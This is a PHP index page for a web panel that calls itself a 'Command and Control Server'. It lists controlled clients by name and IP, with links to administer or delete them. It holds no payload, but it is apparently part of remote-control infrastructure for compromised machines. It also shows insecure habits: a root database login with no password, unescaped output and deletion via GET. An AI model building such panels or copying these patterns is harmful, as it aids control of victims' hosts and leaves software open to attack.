<?php  
	if(isset($_GET['client']) && !empty($_GET['client'])){
		$client =  $_GET['client'] ;
	}
	elseif (isset($_POST['client']) && !empty($_POST['client'])){
		$client = $_POST['client'];
	}
	else{
		$client = 'no client';
	}			
			
?>

<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta http-equiv="X-UA-Compatible" content="ie=edge">
  <title>Control Server</title>
  <style>
    body{
      font-family: Arial, Helvetica, sans-serif;
      text-align: center;
      background-color:  #87ceeb ;
      padding: 20px;
     
    }
	#clienttable{
		text-align: center;
	}
	
    button{
		padding: 10px;
	}
	
	table {
      font-family: arial, sans-serif;
      border-collapse: collapse;
      
	  margin-left: auto;
	  margin-right: auto;
    }

	
	
    td, th {
      border: 1px solid #dddddd;
      text-align: left;
      padding: 8px;
    }

	th{
	  background-color: #f5f5dc;
	}
	
    tr{
      background-color: #ffffff;
    }
   
  </style>
</head>
<body>
  <div id="clienttable">

    <img src="serverIcon.png" alt="" width="180vw">
	<h2>Main Page</h2>
	<?php
	$db = new mysqli('localhost', 'root','', 'control_server');
	if(mysqli_connect_errno()) exit;
	echo '<p>Connected to Command and Control Server</p>';
	$query = "SELECT id, name, ip FROM clients";
	$stmt = $db->prepare($query);
	$stmt->execute();
	$stmt->bind_result($id, $name, $ip);

	
	
	echo '<table>';
	echo '<tr><th>id</th><th>name</th><th>ip</th><th>select</th><th>Delete</th></tr>';
	while($stmt->fetch()){
		echo '<tr>';
		$administer = "<a href='/openClient.php?client=" .$name. "'>administer</a>";
		$delete = "<a href='/index.php?client=" .$name. "'>delete</a>";
		echo '<td>'.$id.'</td><td>'.$name.'</td><td>'.$ip.'</td><td>'.$administer.'</td>'.'</td><td>'.$delete.'</td>';
		echo '</tr>';
	}
	echo '</table>';
	?> 
 
  </div>
	
</body>
</html>


<?php
if(isset($_GET['client']) && !empty($_GET['client'])){
	$client =  $_GET['client'] ;

	$db = new mysqli('localhost', 'root','', 'control_server');
	if(mysqli_connect_errno()) exit;

	$query = "DELETE FROM clients WHERE name=?";
	$stmt = $db->prepare($query);
	$stmt->bind_param('s',$client); 
	$stmt->execute();
	$db->close();
	echo "Client deleted";
	header("Location: /index.php");
}
?>